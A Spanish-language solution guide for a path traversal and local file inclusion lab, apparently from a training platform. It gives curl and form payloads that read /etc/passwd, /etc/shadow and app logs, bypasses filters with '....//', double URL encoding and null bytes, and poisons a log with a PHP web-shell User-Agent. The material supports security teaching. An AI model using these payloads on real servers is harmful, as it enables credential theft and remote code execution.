Objetivo

El parámetro file lee archivos del servidor sin sanear la ruta. Usa path traversal para salir del directorio y leer el archivo secreto con la flag; su contenido se muestra en la página.

Easy — Path traversal directo

  1. El parametro file se concatena con la ruta base static/files/ sin ninguna validacion. En el formulario web introduce rutas relativas con ../ para escapar del directorio base y leer archivos del sistema: 
    # En el formulario web (campo "Ruta del archivo"):
../../../../../etc/passwd
../../../../../etc/shadow
../../secret/LFI/flag.txt
  2. O con curl usando rutas absolutas o traversal: 
    curl "{{ target_base }}/files?file=../../../../../etc/passwd"
curl "{{ target_base }}/files?file=../../../../../etc/shadow"
curl "{{ target_base }}/files?file=/app/app.py"
  3. Lee el log de acceso (preparacion para log poisoning): 
    curl "{{ target_base }}/files?file=/app/logs/access.log"
  4. Log poisoning (concepto de RCE): envenena el log enviando codigo en el User-Agent: 
    curl -A "<?php system(\$_GET['cmd']); ?>" {{ target_base }}/
  5. Verifica que el payload quedo registrado en el log: 
    curl "{{ target_base }}/files?file=/app/logs/access.log"
    Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.
  6. Directory listing vulnerable y flag dedicada LFI: 
    # Via traversal en el formulario web (desde /app/static/files/ → 2 niveles arriba → /app/secret/):
../../secret/LFI/flag.txt          # flag LFI

# Via endpoint de directorio expuesto (navegador/curl, no en el formulario LFI):
curl "{{ target_base }}/secrets"              # directory listing
curl "{{ target_base }}/secrets/LFI/flag.txt"

Medium — Bypass de filtro (strips ../ una vez)

  1. El servidor elimina ../ pero solo en un unico pase. Usa ....// para que tras el reemplazo quede ../: 
    curl "{{ target_base }}/files?file=....//....//etc/passwd"
  2. O URL encoding para evadir el filtro de cadena: 
    curl "{{ target_base }}/files?file=/etc/passwd"
  3. Accede al log del servidor con el mismo bypass: 
    curl "{{ target_base }}/files?file=/app/logs/access.log"

Hard — Bypass de filtro recursivo (double URL encoding)

  1. El filtro elimina ../ en bucle. Usa doble URL-encoding (%25 es %, por lo que %252e decodifica a %2e que decodifica a .): 
    curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"
curl "{{ target_base }}/files?file=/etc/passwd"
  2. O null byte (en versiones antiguas de PHP para truncar la extension): 
    curl "{{ target_base }}/files?file=../../etc/passwd%00.jpg"
  3. Accede al log con el mismo bypass de doble encoding: 
    curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"
curl "{{ target_base }}/files?file=/app/logs/access.log"
